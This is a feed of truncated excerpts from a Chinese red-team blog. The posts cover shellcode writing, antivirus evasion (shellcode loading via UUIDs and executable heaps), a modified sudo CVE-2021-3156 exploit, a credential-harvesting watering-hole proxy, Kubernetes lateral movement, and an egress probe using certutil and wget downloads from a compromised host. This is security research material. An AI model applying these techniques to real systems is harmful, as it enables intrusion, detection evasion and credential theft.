MASM的汇编文件可以直接被Visual Studio编译，这里倒是方便很多，but&amp;hellip; 不管是NASM和MASM在学习的过程中都需要乖乖安装环境。很多黑客的Shellcode都是基于NASM环境开发的，Kali Linux中也默认安装了NASM，评判一个Shellcode的好坏就是短小、精炼、干净，NASM是首选。
0x01 程序是如何产生的？ 这个问题可能已经非常常见了，我觉得有一本书能够很好的诠释《程序员的自我修养：链接、装载与库》2016年我还买过这本，当时在学习C语言开发，觉得写的真好。
一个程序是由编译器编译代码生成的，编译的过程中经过了一系列步骤，涉及到本文知识的主要是程序的链接。首先，一段C语言代码，经过编译器生成Obj文件，这个文件包含了要执行的所有代码，但是这还不够，还缺少生成复合操作系统平台格式的过程，目前系统中能够跑起来的程序都遵循着COFF规范，Linux下是elf，Windows下是exe。
0x02 从NASM汇编到EXE执行文件 首先，需要写一段测试代码，然后生成目标文件，经过链接器将目标文件进行链接，生成PE文件。
测试代码：
1 2 3 4 5 6 7 8 9 10 ; win.asm global Start section .data section .text Start: mov eax,10 int 3 通过nasm编译：
1 2 nasm -f obj win.asm # 生成目标文件 nasm -f win32 win.asm # 如果要采用VS自带的链接器，就使用win32格式。 如果要采用VS自带的链接器，就使用win32格式: nasm -f win32 win.asm
可以看到生成了win.obj，接下来使用链接器进行链接，选择不同的链接器生成的文件会有差异，经过测试w32nasm中提供的alink生成的PE文件和VS自带的Link有很大区别，而且PE的节表名称不能带. ，而Windows平台大部分PE文件的节表名称都是带.的，比较规范，因此这里就采用了VS自带的Link。
将win.exe拖入x32dbg进行调试查看：
汇编生成的文件就是那么简洁&amp;hellip;.
0x03 Shellcode的通用编写思路 大部分通用的Shellcode编写思路都是从FS寄存器去寻找PEB，然后遍历PEB中的模块列表，从模块列表中寻找Kernel32.dll和ntdll.dll的基址，最终不断从模块中找到API的地址进行调用。</description></item><item><title>某系统 - Java Filter内部反射功能完成远程代码执行</title><link>https://payloads.online/archivers/2021-12-01/1/</link><pubDate>Wed, 01 Dec 2021 00:37:56 +0800</pubDate><guid>https://payloads.online/archivers/2021-12-01/1/</guid><description>0x00 Java Servlet API 之 Filter Filter，字面意思有过滤的意思，其实在Servlet API中，它就是充当了一个过滤器，2000年，Sun公司在Servlet 2.3规范中添加了Filter功能，并在Servlet 2.4中对Filter进行了细节上的补充。每一个Java Servlet Web都可以设置多个Filter，开发人员可以通过web.xml配置Filter的过滤范围。Filter的实现主要通过Servlet API中提供的Filter接口定义的方法，其实就三个方法。
1 2 3 4 5 6 7 8 9 10 11 public interface Filter { void init(FilterConfig var1) throws ServletException; // 对Filter进行初始化，可以通过FilterConfig对象读取web.xml中的&amp;lt;init-param&amp;gt;&amp;lt;/init-param&amp;gt; // init只会在Web服务启动时执行1次 void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException; // Filter主要的过滤方法实现，主要是对不同的请求做不同的动作，ServletRequest对象可以转换为HttpServletRequest void destroy(); // Filter执行完毕所要做的操作可以在这个函数中实现 // destroy只会在Web服务停止时执行1次 } 0x01 Filter中的FilterChain 通常开发人员会使用web.xml来配置当前站点的各种信息，例如：Servlet、Filter、Listener、显示名称、描述&amp;hellip;等其他信息，关于web.xml的格式定义，oracle官方有一个非常详细的说明。
假设漏洞环境中的web.xml定义了分别有LoaderFilter、StaticFilter，都在com.web.包下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 &amp;lt;!</description></item><item><title>MacOS任务计划</title><link>https://payloads.online/archivers/2021-11-23/1/</link><pubDate>Tue, 23 Nov 2021 10:10:08 +0800</pubDate><guid>https://payloads.online/archivers/2021-11-23/1/</guid><description>0x00 launchctl launchctl是一个统一的服务管理框架，启动、停止和管理守护进程、应用程序、进程和脚本。
launchctl 将根据这个plist文件的信息来启动任务，具体可以参考：Creating Launch Daemons and Agents
以下示例创建一个每五分钟（300 秒）运行一次的作业：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt; &amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;com.example.touchsomefile&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt; &amp;lt;array&amp;gt; &amp;lt;string&amp;gt;touch&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;/tmp/helloworld&amp;lt;/string&amp;gt; &amp;lt;/array&amp;gt; &amp;lt;key&amp;gt;StartInterval&amp;lt;/key&amp;gt; &amp;lt;integer&amp;gt;300&amp;lt;/integer&amp;gt; &amp;lt;/dict&amp;gt; &amp;lt;/plist&amp;gt; 0x01 守护进程服务文件路径 plist按照如下优先级排列（由低到高）：
~/Library/LaunchAgents 由用户自己定义的任务项 /Library/LaunchAgents 由管理员为用户定义的任务项 /Library/LaunchDaemons 由管理员定义的守护进程任务项 /System/Library/LaunchAgents 由Mac OS X为用户定义的任务项 /System/Library/LaunchDaemons 由Mac OS X定义的守护进程任务项 一般情况下，大部分都只用到~/Library/LaunchAgents。
0x02 定义运行周期 特殊关键字：</description></item><item><title>BeingDebugged反调试技巧</title><link>https://payloads.online/archivers/2021-09-13/1/</link><pubDate>Mon, 13 Sep 2021 10:10:08 +0800</pubDate><guid>https://payloads.online/archivers/2021-09-13/1/</guid><description>0x01 Windows PEB(Process Environment Block) Windows PEB，中文的含义是进程环境块，意味着其中包含了很多与进程相关的复杂信息。微软官方给出了Windows PEB的结构体标准，每一个字段都代表了特定的意义。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; 在Windbg中可以直观的看到PEB字段的详细信息：</description></item><item><title>MASM中VirtualProtect函数的分析</title><link>https://payloads.online/archivers/2021-09-03/1/</link><pubDate>Fri, 03 Sep 2021 10:10:08 +0800</pubDate><guid>https://payloads.online/archivers/2021-09-03/1/</guid><description>0x00 调用约定 __stdcall关键字用于约定调用Win32 API函数的参数入栈顺序，它的入栈顺序是由右向左，一般C/C++语言代码中没有声明调用约定的话，默认就是__stdcall调用约定。
C++中如果要声明函数的调用约定，可以通过以下格式：
1 2 3 void __stdcall CMyClass::mymethod() { return; } 0x01 栈与调用约定的关系 提到栈，这已经是计算机知识体系里面老生常谈的技术了，并且互联网上已经有大量的文章去讲解栈的工作机制。
下面说说我对栈的理解：
函数调用离不开栈 栈用于完整保留调用前CPU的状态值，堆用于保留临时变量，实现了在函数体内部共享内存 栈溢出一般是由于局部变量填满了栈的空间，没有及时释放，导致溢出，比如递归stack overflow 栈遵循先入后出的原则 &amp;hellip;.. 写一段汇编：
1 2 3 4 push 10h ; 代表第 1 个参数 push 20h ; 代表第 2 个参数 pop eax ; eax = 20h pop ebx ; ebx = 10h 栈遵循先入后出的原则，栈顶ESP是低地址，栈底EBP是高地址。
0x02 使用汇编调用Win32 API 环境：Visual Studio 2019 （MSVC工具集版本14.26以下）
MSVC工具集版本14.26以下才能够编译MASM正常调用Win32 API的代码，这里我使用的是14.21.27702。
安装低版本MSVC工具集版本 打开Visual Studio Installer，点击修改：
红框内的工具集版本都支持正常编译。
MASM INVOKE 32位模式中，可以用Microsoft的INVOKE、PROTO 和扩展 PROC 伪指令新建多模块程序。与更加传统的CALL和EXTERN相比，它们的主要优势在于：能够将INVOKE传递的参数列表与PROC声明的相应列表进行匹配。</description></item><item><title>博客更新了</title><link>https://payloads.online/archivers/2021-08-30/2/</link><pubDate>Mon, 30 Aug 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-08-30/2/</guid><description>接下来的时间会将自己的知识进行归纳，将博客中错误的内容进行更正，将没有成体系的知识文章进行选择性删除&amp;hellip;.</description></item><item><title>Windows活动目录中的LDAP</title><link>https://payloads.online/archivers/2021-08-11/1/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-08-11/1/</guid><description>LDAP基础概念 条目（Entry） 一个条目有若干个属性，每一个属性应对一个或多个值，有些条目可以包含若干个子条目。
这里使用Active Directory Explorer连接一个域环境进行展示：
其中 DC=domain.16,DC=local 以下（包含本身），都是条目，每一个条目点开都拥有N个属性名和属性值，右侧密密麻麻的就是属性名和属性值。
识别名（Distinguished Name, DN） 它表示条目在LDAP目录树中从根出发的绝对路径，是条目的唯一标识。其中上一节中的DC=domain16,DC=local就是域的根，这个根的DN就是DC=domain16,DC=local，根的DN通常被称为Base DN。
我们随便点开一个计算机条目观看，发现他们都拥有一个objectCatory属性，这个属性的值就是用于描述条目的路径，也就是说，如果要从LDAP中精确的寻找到某个对象，就可以通过DN来寻找，编程的思路也是如此。
相对识别名（Relative Distinguished Name, RDN） 例如上方的USERPC1的DN为：CN=USERPC1,CN=Computers,DC=domain16,DC=local，那么CN=USERPC1,CN=Computers就是RDN，RDN是相对于Base DN的DN。
在一般情况下，RDN 以 dc=、ou=、c=、o= 开头的条目为容器，可以包含子条目。
模式（Schema） 模式是对象类（ObjectClass）、属性类型（AttributeType）、属性语法（Syntax）和匹配规则（MatchingRules）的集合。
对象类（ObjectClass） 对象类封装了必选的属性和可选的属性，同时对象类也是支持继承的。通过对象类可以很方便地指定条目的类型，一个条目也可以绑定多个对象类。
例如在Windows域内，每一个计算机都至少继承了computer类：
属性类型（AttributeType） 属性类型定义了属性值的设定规则（属性语法），以及同一个属性的各个数据相互比较的规则等。
LDAP Filter 进阶 LDAP objectCategory与objectClass 微软的网站上有一篇关于LDAP Filter非常详细的文章：https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
获取所有域内计算机对象 通过ldapsearch可以跟进不同的条件去检索域内的数据，上面的表格中明确了objectCategory属性与objectClass属性组合可以获取指定对象，通过这个表格，我们尝试获取域内的所有机器:
1 ldapsearch -h 192.168.49.132 -b dc=domain16,dc=local -D cn=zhangsan,ou=officeuser,dc=domain16,dc=local -w San@123 objectClass=computer dn LDAP Search Option 说明:
-H	ldapuri，格式为ldap://机器名或者IP:端口号，不能与-h和-p同时使用 -h	LDAP服务器IP或者可解析的hostname，与-p可结合使用，不能与-H同时使用 -p	LDAP服务器端口号，与-h可结合使用，不能与-H同时使用 -x	使用简单认证方式 -D	所绑定的服务器的DN -w	绑定DN的密码，与-W二者选一 -W	不输入密码，会交互式的提示用户输入密码，与-w二者选一 -f	指定输入条件，在RFC 4515中有更详细的说明 -c	出错后忽略当前错误继续执行，缺省情况下遇到错误即终止 -n	模拟操作但并不实际执行，用于验证，常与-v一同使用进行问题定位 -v	显示详细信息 -d	显示debug信息，可设定级别 -s	指定搜索范围, 可选值：base|one|sub|children 获取所有域内用户对象 这里涉及到LDAP的条件逻辑运算，LDAP共有6个逻辑运算符，分别如下：</description></item><item><title>Kubernetes(K8s)横向移动办法</title><link>https://payloads.online/archivers/2021-07-20/1/</link><pubDate>Tue, 20 Jul 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-07-20/1/</guid><description>博客半年没写了，来除除草&amp;hellip;. :(
0x01 Kubernetes 简介 Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。
传统部署时代：
早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。 例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。 一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。
虚拟化部署时代：
作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。 虚拟化允许应用程序在 VM 之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。
虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。
每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。
容器部署时代：
容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。 因此，容器被认为是轻量级的。容器与 VM 类似，具有自己的文件系统、CPU、内存、进程空间等。 由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。
以上摘自Kubernetes官方文档：https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/
0x02 Kubernetes 关键概念介绍 Kubernetes有如下几个与本文相关的概念：
节点(Node) Pod 容忍度(Toleration)与污点(Taint) 节点(Node) Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。 节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：
该集群有三个节点，我可以在这三个节点上创建很多个Pod，而Pod中可以包含多个容器。在所有的节点中，至少要有一个Master节点，Master节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到Master节点，因为Secret敏感信息(令牌、账户密码、公私钥等等)都存储在Kubernetes的etcd数据库上。
Pod Pod是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。
Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。 Pod中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。 Pod所建模的是特定于应用的“逻辑主机”，其中包含一个或多个应用容器， 这些容器是相对紧密的耦合在一起的。 在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。
Pod的共享上下文包括一组 Linux 名字空间、控制组（cgroup）和可能一些其他的隔离方面，即用来隔离Docker容器的技术。 在Pod的上下文中，每个独立的应用可能会进一步实施隔离。</description></item><item><title>红队技巧：基于反向代理的水坑攻击</title><link>https://payloads.online/archivers/2021-02-16/1/</link><pubDate>Tue, 16 Feb 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-02-16/1/</guid><description>完整项目代码：
Go语言版本：Pricking NodeJS版本：Pricking-node 0x00 前言 在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。
0x01 实现目标 先明确一下实现目标：
支持快速部署 完美克隆任意网站 可扩展的模块（受害者执行） 收集所有凭证（除了Cookie还有POST数据） 0x02 Nginx实现 - 快速部署与完美克隆 互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。
OpenResty® 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。
根据它的官方文档和开源仓库我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。
首先拉取镜像到本地，方便后续的操作：
1 docker pull openresty/openresty:alpine OpenResty配置文件 OpenResty Docker环境共有两块需要关注的配置文件：
/etc/nginx/conf.d /usr/local/openresty/nginx/conf/nginx.conf 其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。
OpenResty - Lua Ngx API 若想要在Nginx配置中执行Lua代码，需要遵循Lua Ngx API，文档中提供了*_by_lua，*_by_lua_block和*_by_lua_file来引入Lua代码。
nginx.conf简单实例：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 worker_processes 1; error_log logs/error.</description></item><item><title>CVE-2021-3156 - Exploit修改</title><link>https://payloads.online/archivers/2021-02-09/1/</link><pubDate>Tue, 09 Feb 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-02-09/1/</guid><description>New-Exploit : https://github.com/Rvn0xsy/CVE-2021-3156-plus
0x01 为什么要修改？ 本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。
0x02 Linux 管道符 在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：
1 echo &amp;#34;new-pass&amp;#34; | passwd --stdin username 该命令只适用于旧版，不建议在命令行中传递明文密码
于是我查看了sudoedit的帮助参数：
设置-S参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。
0x03 Exploit分析 本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用execve触发。
1 2 #include &amp;lt;unistd.h&amp;gt; int execve(const char *pathname, char *const argv[],char *const envp[]); 在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：
1 2 3 4 5 6 char* sudoedit_argv[] = { &amp;#34;sudoedit&amp;#34;, &amp;#34;-S&amp;#34;, // --stdin 非交互式 &amp;#34;-s&amp;#34;, buf, NULL}; 紧接着，需要思考如何传入密码了。
经过测试，即使密码错误的情况下，也能够提权成功。
经过查阅资料，关于execve的特点如下：
execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。
All process attributes are preserved during an execve(), except the following:</description></item><item><title>静态恶意代码逃逸（第十课）</title><link>https://payloads.online/archivers/2021-02-08/1/</link><pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-02-08/1/</guid><description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 UUID 通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 — 来源：维基百科
关于Windows中的GUID也等同于UUID，先看一下结构：
1 2 3 4 5 6 typedef struct _GUID { unsigned long Data1; // 4字节 unsigned short Data2; // 2字节 unsigned short Data3; // 2字节 unsigned char Data4[8]; // 8字节 } GUID; 总和一共16字节，16*8 = 128位。
0x02 与UUID相关的Windows API 1 2 3 4 RPC_STATUS UuidFromString( RPC_CSTR StringUuid, UUID *Uuid ); 功能：将字符串UUID转换为UUID结构。
1 2 3 RPC_STATUS UuidCreate( UUID *Uuid ); 功能：创建UUID结构。</description></item><item><title>Windows权限控制相关的防御与攻击技术</title><link>https://payloads.online/archivers/2021-01-31/1/</link><pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2021-01-31/1/</guid><description>0x00 前言 近年来终端安全检测与响应的产品发展迅速，我们不得不意识到，安全是在一个循环中发展的，从人们意识到安全开始，大部分了解到层面都是病毒、木马，然后接着是浏览器相关的Web安全领域，最后又开始回到终端。这个议题我们通过了解Windows操作系统下的访问控制技术，站在攻防的不同角度去进行对抗，提升自身的知识储备，个人觉得这些知识适用于许多使用Windows操作系统的用户。
0X01 安全描述符(Security Descriptors，SD) 在Windows中，每一个安全对象实体都拥有一个安全描述符，安全描述符包含了被保护对象相关联的安全信息的数据结构，它的作用主要是为了给操作系统提供判断来访对象的权限。
1 2 3 4 5 6 7 8 9 0:000&amp;gt; dt nt!_security_descriptor ntdll!_SECURITY_DESCRIPTOR +0x000 Revision : UChar # 版本 +0x001 Sbz1 : UChar # 大小 +0x002 Control : Uint2B # 一组标志，用于限定安全描述符或安全描述符的各个字段的含义 +0x008 Owner : Ptr64 Void # 指定对象的所有者（SID） +0x010 Group : Ptr64 Void # 指定对象的主组（SID） +0x018 Sacl : Ptr64 _ACL # 系统访问控制列表 +0x020 Dacl : Ptr64 _ACL # 自主访问控制列表 Windows具体有哪些安全对象？ 进程 线程 文件 服务 计划任务 互斥体 管道 油槽 文件共享 访问令牌 注册表 打印机 作业 &amp;hellip; 一般情况下，大部分用户接触更多的可能就是文件了，我们就以文件开始，文件对于我们去学习访问控制是最直观的。</description></item><item><title>静态恶意代码逃逸（第九课）</title><link>https://payloads.online/archivers/2020-11-29/2/</link><pubDate>Sun, 29 Nov 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-11-29/2/</guid><description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 数据执行保护（DEP） DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 微软从Windows XP SP2引入了该技术，并一直延续到今天。
为什么要有DEP 在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限。
0x02 如何绕过DEP VirtualProtect这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为VirtualProtect的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从&amp;quot;不可执行&amp;quot;变成&amp;quot;可执行&amp;quot;。
0x03 举一反三 由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？
HeapCreate可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：
1 2 3 4 HANDLE WINAPI HeapCreate( __in DWORD flOptions, __in SIZE_T dwInitialSize, __in SIZE_T dwMaximumSize ); 第一个参数flOptions用于修改如何在堆栈上执行各种操作。 你可以设定0、HEAP_NO_SERIALIZE、HEAP_GENERATE_EXCEPTIONS、HEAP_CREATE_ENABLE_EXECUTE或者是这些标志的组合。
HEAP_NO_SERIALIZE：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。 HEAP_GENERATE_EXCEPTIONS：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。 HEAP_CREATE_ENALBE_EXECUTE：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。 看到HEAP_CREATE_ENALBE_EXECUTE相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。
0x04 Shellcode执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include &amp;lt;iostream&amp;gt; #include &amp;lt;Windows.</description></item><item><title>静态恶意代码逃逸（第八课）</title><link>https://payloads.online/archivers/2020-11-29/1/</link><pubDate>Sun, 29 Nov 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-11-29/1/</guid><description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 字符串 一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到。
例如：
1 2 3 4 5 6 7 8 9 #include &amp;lt;stdio.h&amp;gt; char global_string[] = &amp;#34;123456&amp;#34;; int main(){ printf(&amp;#34;%s \n&amp;#34;, global_string); } 如果编写的是一些敏感参数的工具，很容易会被提取出特征，例如lcx这款工具，它的参数如下：
1 2 3 4 5 6 7 8 9 [Usage of Packet Transmit:] lcx -&amp;lt;listen|tran|slave&amp;gt; &amp;lt;option&amp;gt; [-log logfile] [option:] -listen &amp;lt;ConnectPort&amp;gt; &amp;lt;TransmitPort&amp;gt; -tran&amp;lt;ConnectPort&amp;gt; &amp;lt;TransmitHost&amp;gt; &amp;lt;TransmitPort&amp;gt; -slave &amp;lt;ConnectHost&amp;gt; &amp;lt;ConnectPort&amp;gt; &amp;lt;TransmitHost&amp;gt;&amp;lt;TransmitPort&amp;gt; 其中，-listen、-tran、-slave非常敏感，一般常见程序不会高频使用这些参数名，因此落地被杀也是意料之中。
0x02 C++ 重载运算符 C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为函数重载和运算符重载。
这里需要使用重载运算符来方便我们编程： 重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。
简单的例子如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #pragma once #include &amp;lt;iostream&amp;gt; #include &amp;lt;string&amp;gt; #include &amp;lt;Windows.</description></item><item><title>Linux透明代理在红队渗透中的应用</title><link>https://payloads.online/archivers/2020-11-13/1/</link><pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-11-13/1/</guid><description>0x00 前言 决定写这篇文章是我解决了所有问题以后决定记录一下这个过程所写的，因此可能会忽略很多细节上的东西。
问题一：打点的时候经常会被WAF封禁IP怎么办？ 问题二：内网的时候只想代理部分目的地址怎么办？ 我想大部分人解决问题一的方案就是不断切换出口IP，使得出口地址一直改变，避免被封，而解决问题二的方案可能就是Proxifier或者Proxycap。
Proxifier是一款能够实现系统全局代理的软件，它支持的代理类型有：Http、Https、Socks4a、Socks5.
在使用Windows渗透的过程中，我经常使用Proxifier来实现进程单位的代理进行内网渗透，利用好rules就能避免系统全局流量被导入代理，流量流入内网从而暴露自己的一些信息。
以上两个问题在Windows下不是问题，我之前经常使用Kali Linux来进行渗透，自从更新版本以后，它设置系统代理需要自己写PAC文件，这一点增加了一点点学习门槛，并且好像不是那么好用。最近我使用Arch Linux已经有段时间了，并且把它安装在了我的工作机、家庭电脑上，我非常喜欢这个操作系统和这个操作系统的生态。
因此我不得不开始完全适应更多在Linux上渗透的场景，这也让我收获颇多，这篇文章就记录一下我如何学习自己搭建透明代理实现愉快的工作环境。
0x01 透明代理 什么是透明代理？ 透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的request fields（报文），并会传送真实IP，多用于路由器的NAT转发中。
为什么要用到透明代理？ 因为这样能够让我的机器“身处”在内网中，也能让我的机器在“世界上的任何角落里”。
大家都知道，在Linux下常规的内网渗透需要使用一些如：proxychains的工具实现指定的进程访问内网的资源，相当于给程序套了一层代理。
它的实现原理如下：
ProxyChains is a UNIX program, that hooks network-related libc functions in dynamically linked programs via a preloaded DLL and redirects the connections through SOCKS4a/5 or HTTP proxies.
关于LD_PRELOAD之前有写过相关文章：Linux权限维持之LD_PRELOAD
它的缺点却是每个命令必须要在前面加上proxychains，这样Bash shell有时候可能不会正常工作给我们进行参数提示。
我要做的就是使用iptables实现透明代理，让我的机器所有与目标地址相关的流量都导入socks5代理端口。
题外话一，关闭proxychains的输出信息可以将/etc/proxychains.conf文件中的quiet_mode前面的#去除。
题外话二，设置metasploit全局代理的方法：
可以将metasploit全局变量proxies的值进行设置来使得后续所有的流量都经过代理发出，这样能够达到内网穿透的效果。
图中演示了2层代理的设置
0x02 Linux下的iptables防火墙 iptables是一个用户空间实用程序，它允许系统管理员配置Linux内核防火墙的IP数据包过滤器规则，这些规则实现为不同的Netfilter模块。筛选器组织在不同的表中，这些表包含有关如何处理网络流量数据包的规则链。当前，不同的内核模块和程序用于不同的协议。iptables适用于IPv4，ip6tables适用于IPv6，arptables适用于ARP，而ebtables适用于以太网帧。
学习iptables有一点门槛，需要对表、规则链、动作等关系有一定的了解，这里不继续铺垫，可以自行搜索关于iptables的文章。
流量导入Socks代理 通过将规则插入到NAT表的PREROUTING链中，可以轻松地重定向传入流量。
例如：
1 iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080 所有访问eth0网卡80端口的流量，都会被重定向到8080端口。</description></item><item><title>Web正向代理的思考</title><link>https://payloads.online/archivers/2020-11-01/1/</link><pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-11-01/1/</guid><description>0x01 背景假设 获取Webshell后，但是机器不出网（DNS、TCP、UDP）等常规端口都进行了尝试。
不出网的解释：内部的Webshell服务器无法连接互联网。
尝试过的方案有：
1 2 3 4 5 6 7 8 9 10 11 title 出网探测方式 state TCP { WindowsHttp : certutil -f -split -urlcache http://domain/com LinuxHttp: wget &amp;lt;URL&amp;gt; } state UDP{ DNS : nslookup domain.com } state ICMP{ ICMP: ping domain.com } 那么，一般我们会尝试：
reGeorg Neo-reGeorg reDuh pivotnacci &amp;hellip; 这种类型的工具往往都有一个特性：通过脚本帮助我们把HTTP协议转换成Socks，由于HTTP协议无状态，因此需要发送大量数据包。
